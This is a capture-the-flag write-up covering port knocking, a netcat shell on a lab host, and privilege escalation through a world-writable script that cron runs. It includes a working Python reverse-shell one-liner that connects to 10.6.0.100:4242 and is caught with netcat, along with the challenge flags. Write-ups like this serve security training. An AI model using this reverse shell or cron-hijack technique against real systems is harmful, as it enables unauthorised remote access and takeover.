# Knock knock knocking on shuttles door

## Categories

web, privesc, network

## Writeup

1. Given the website IP __10.6.0.2__ (after OpenVPN) and a slight recon to know that Apache/2.4.41 (Ubuntu) Server is running on port __80__, Directory search starting from `/` with OWASP DirBuster, that leads to the finding of the following site structure :
	
```
	/
	|- /icons
	|- /Home
		|- *.jpg
	|- /WhoIsThere
		|- /OpenSesame 
```

2. The hidden text file contains :

It would be a tcp syn to knock on the doors of air locks:
1337
68
61
78

thus, we can get the first flag here

3. After TCP SYN scan with Nmap, we can see that all 4 ports are closed at the moment, which may indicates that there is firewall or similar security protection that is blocking the connection
4. By using port knocking [technique](https://d00mfist.gitbooks.io/ctf/content/port_knocking.html) on the given ports in the same order, and have the Nmap scanning afterward  (ie. `knock 10.6.0.2 1337 68 61 78 && nmap 10.6.0.2`), we can see that there is a new open port on port __2021__
5. We can start the communication with port 2021 through [netcat](https://linux.die.net/man/1/nc), which leads us to a remote shell service that give us the access to the system (username:spaceotter)
6. After a simple shell upgrading and stabilization, we can simply use `ls -la` command to list the current directory, and `cat` command to output the content of flag.txt, that give us the 2nd flag

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
```

7. During the searching of privesc vulnerable component I found a suspicious bash file named `safetyCheck` in directory `/opt` , which is owned by `root` but anyone can modify it
8. Cron job is running on the target system, that has the following content in definition file `/etc/crontab` :

```text

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

```

In file `/etc/cron.d/cronJob` :

```text

SHELL=/bin/bash					# Use /bin/sh to run commands, no matter what /etc/passwd says
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=control					# Mail any output to `control`, no matter whose crontab this is

* * * * * control /opt/safetyCheck.sh		# Execute this script at every minute as user `control`

```

Command `crontab -e` does the editing of the current crontab using the editor specified by the VISUAL or EDITOR environment variables. After you exit from the editor the modified crontab will be installed automatically

Running process with command `ps -aux` :

```text
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0  27740 22912 ?        Ss   13:24   0:00 /usr/bin/pyth
root           8  0.0  0.0   2608   592 ?        S    13:24   0:00 /bin/sh /usr/
root           9  0.0  0.0   4044  2596 ?        S    13:24   0:00 cron -f		# stay in foreground mode
root          10  0.0  0.0   4884   704 ?        S    13:24   0:00 knockd -D -v
root          13  0.0  0.0   6668  5396 ?        S    13:24   0:00 /usr/sbin/apa
www-data      14  0.0  0.0 1932212 4028 ?        Sl   13:24   0:00 /usr/sbin/apa
www-data      15  0.0  0.0 1932212 4028 ?        Sl   13:24   0:00 /usr/sbin/apa
root          80  0.0  0.0   4884  3280 ?        Ss   13:25   0:00 knockd -D -v
root          81  0.0  0.0   2608   608 ?        S    13:25   0:00 sh -c socat t
root          82  0.0  0.0   6964  1844 ?        S    13:25   0:00 socat tcp-l:2
root          88  0.0  0.0   7044  2708 ?        S    13:25   0:00 socat tcp-l:2
root          89  0.0  0.0   4740  3092 pts/0    Ss   13:25   0:00 su - spaceott
spaceot+      90  0.0  0.0   2608   540 pts/0    S    13:25   0:00 -sh
spaceot+      93  0.0  0.0  12364  8820 pts/0    S+   13:25   0:00 python3 -c im
spaceot+      94  0.0  0.0   4468  3704 pts/1    Ss   13:25   0:00 /bin/bash
spaceot+     719  0.0  0.0   4468  3500 pts/1    S    14:20   0:00 /bin/bash
spaceot+     722  0.0  0.0   4468  3772 pts/1    S    14:20   0:00 bash -h
spaceot+     781  0.0  0.0   6116  3004 pts/1    R+   14:25   0:00 ps -aux
```

9. Since we are able to change the script file, thus we can create a new reverse shell through the payload

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.0.100",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

and create a reverse shell from local with `netcat`, ie. `nc -nlvp 4242`

10. After several minutes, you should be able to get the following reverse shell as user `control` and get your last flag !

## Flags

1. ctf{1337,68,61,78}
2. ctf{we_have_lift_off}
3. ctf{sudoToTheMoon} (help with CyptoCat's writeup)

## References

- [OWASP Dirbuster on Kali](https://tools.kali.org/web-applications/dirbuster)
- [TCP SYN scan with Nmap](https://nmap.org/book/synscan.html)
- [Nmap service listing](https://svn.nmap.org/!svn/bc/3320/nmap/nmap-services)
- [TryHackMe Advent of Cyber 2 Day 24 - Upgrade and stabilize your remote shell](https://tryhackme.com/room/adventofcyber2)
- [TryHackMe Linux Privilege Escalation](https://tryhackme.com/room/linuxprivesc)
- [About crontab(1) command](https://man.openbsd.org/crontab.1)
- [About crontab(5) cronJob configuration](https://man.openbsd.org/crontab.5)
- [Crontab syntax checker](https://crontab.guru)
- [Difference between crontab and cron.d](https://unix.stackexchange.com/questions/417323/what-is-the-difference-between-cron-d-as-in-etc-cron-d-and-crontab)
- [CyptoCat's Writeup on Youtube](https://www.youtube.com/watch?v=hY446_xs-DE&t=2590s) [Task 3 only]
- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/2148c894524d89892db681e2a815c45939fdc61b/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
- [About netcat](https://en.wikipedia.org/wiki/Netcat)